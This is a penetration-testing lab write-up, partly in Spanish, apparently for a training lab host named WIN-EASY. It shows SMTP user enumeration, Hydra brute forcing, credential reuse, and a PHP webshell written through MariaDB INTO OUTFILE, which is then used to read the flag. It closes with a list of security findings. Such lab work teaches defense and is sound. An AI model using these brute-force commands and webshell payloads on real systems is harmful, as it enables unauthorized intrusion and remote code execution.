# Attacking Common Services - Easy (WIN-EASY)

We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access.

### You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer.

First, we run a full port/version scan against the target to identify every service running on the host:

```shell
sudo nmap -Pn -sV -sC -v 10.129.203.7 -T4 -oA easy
--
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
| http-title: Welcome to XAMPP
443/tcp  open  https?
587/tcp  open  smtp          hMailServer smtpd
3306/tcp open  mysql         MariaDB 5.5.5-10.4.24
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-EASY
|   NetBIOS_Domain_Name: WIN-EASY
|   NetBIOS_Computer_Name: WIN-EASY
|   DNS_Domain_Name: WIN-EASY
Service Info: Host: WIN-EASY; OS: Windows; CPE: cpe:/o:microsoft:windows
```

El escaneo revela varios servicios interesantes: un servidor FTP (`Core FTP Server 2.0`), dos servicios SMTP en los puertos 25 y 587 (`hMailServer`) que exponen el hostname `WIN-EASY`, un servidor web corriendo `XAMPP` sobre Apache (puertos 80/443), una instancia de `MariaDB` en el puerto 3306, y RDP en el puerto 3389. El script `rdp-ntlm-info` confirma que el objetivo es un host Windows cuyo nombre es `WIN-EASY`.

Dado que el servicio SMTP está expuesto, enumeramos nombres de usuario válidos en el servidor de correo usando `smtp-user-enum` con el método `RCPT`:

```shell
smtp-user-enum -t 10.129.203.7 -U users.list -M RCPT -D inlanefreight.htb
---
10.129.203.7: fiona@inlanefreight.htb exists
```

Encontramos el correo de la usuaria `fiona`, confirmando que es un usuario válido del dominio `inlanefreight.htb`.

>[!Important]
>Los puertos de lectura de correo (POP3 110 / IMAP 143, 993, 995) están cerrados, por lo que el buzón de `fiona` no es accesible directamente. Solo queda disponible el SMTP (25/587) para autenticar, así que la fuerza bruta se dirige ahí en lugar de a POP3/IMAP.

Con el usuario confirmado, lanzamos `Hydra` contra el servicio SMTP:

```shell
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://10.129.203.7
---
[25][smtp] host: 10.129.203.7   login: fiona@inlanefreight.htb   password: 987654321
```

Obtenemos la credencial `fiona:987654321`. Como SMTP solo permite autenticar y enviar correo (no leer el buzón), el valor de esta credencial está en reutilizarla contra otros servicios expuestos.

Probamos la credencial en el servicio FTP (`Core FTP`):

```shell
ftp 10.129.203.7
Name: fiona
Password: 987654321
230 Logged on
```

El acceso es concedido, pero la sesión queda enjaulada (`chroot`) dentro del directorio de `fiona`, no en el filesystem completo. Dentro de ese directorio encontramos un archivo clave, `WebServersInfo.txt`:

```shell
CoreFTP:
Directory C:\CoreFTP
Ports: 21 & 443

Apache
Directory "C:\xampp\htdocs\"
Ports: 80 & 4443
Test Command: curl http://localhost/test.php
```

Este archivo confirma el webroot de Apache/XAMPP: `C:\xampp\htdocs\`, dato decisivo para la explotación. Sin embargo, al estar enjaulada la sesión FTP (`550 CWD failed` al intentar `cd C:/xampp/htdocs`), no es posible subir un webshell directamente por este medio, así que pivotamos a MariaDB, que no está enjaulado.

Probamos la misma credencial reutilizada contra MySQL/MariaDB (el cliente moderno exige TLS, que el servidor no soporta, por lo que se desactiva con `--skip-ssl`):

```shell
mysql -h 10.129.203.7 -u fiona -p --skip-ssl
```

Una vez dentro, revisamos los privilegios del usuario:

```sql
SHOW GRANTS;
---
GRANT ALL PRIVILEGES ON *.* TO `fiona`@`%` IDENTIFIED BY PASSWORD '*DABCF719388B72AD432DE5E88423B56D652DD8B0' ...
```

`fiona` resulta ser administradora de la base de datos (`ALL PRIVILEGES ON *.*`), lo que incluye el privilegio `FILE`, necesario para escribir archivos en disco desde el motor de base de datos.

Con el privilegio `FILE` y el webroot ya identificado, escribimos un webshell PHP directamente en `C:\xampp\htdocs\` usando `INTO OUTFILE`:

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/xampp/htdocs/shell.php';
```

>[!Important]
>Se usan barras normales (`/`) en la ruta porque MySQL interpreta la barra invertida (`\`) como carácter de escape.

Finalmente, ejecutamos comandos a través del webshell vía HTTP, pasando el comando por el parámetro `cmd`:

```shell
http://10.129.203.7/shell.php?cmd=whoami
```

Con RCE confirmado, leemos la flag directamente (sin necesidad de una reverse shell interactiva) usando `type` (el equivalente de `cat` en Windows):

```shell
http://10.129.203.7/shell.php?cmd=type%20C:\Users\Administrator\Desktop\flag.txt
```

La flag se obtiene desde el escritorio del `Administrator`, ya que el proceso de Apache de XAMPP corre con privilegios suficientes para leer ese directorio sin necesidad de escalada adicional.

**Cadena de ataque:** SMTP user enum (`fiona` válida) → fuerza bruta con Hydra sobre SMTP (`fiona:987654321`) → reutilización de la credencial en FTP → `WebServersInfo.txt` revela el webroot → reutilización de la credencial en MariaDB (fiona = DBA con `FILE`) → webshell vía `INTO OUTFILE` en `C:\xampp\htdocs\` → RCE → flag.

**Hallazgos de seguridad:**
- Reutilización de credenciales entre servicios (correo, FTP y base de datos) — vector principal del compromiso.
- Contraseña débil (`987654321`), encontrada en segundos con `rockyou.txt`.
- `VRFY`/`RCPT` habilitado en hMailServer, permitiendo enumeración de usuarios sin autenticación.
- Usuario de base de datos sobreprivilegiado (`ALL PRIVILEGES` + `FILE`) para lo que debería ser una cuenta de aplicación.
- `secure_file_priv` permisivo (default de XAMPP), que permitió el `INTO OUTFILE` hacia el webroot.
- Apache corriendo con privilegios elevados, pudiendo leer el directorio del Administrator sin escalada.
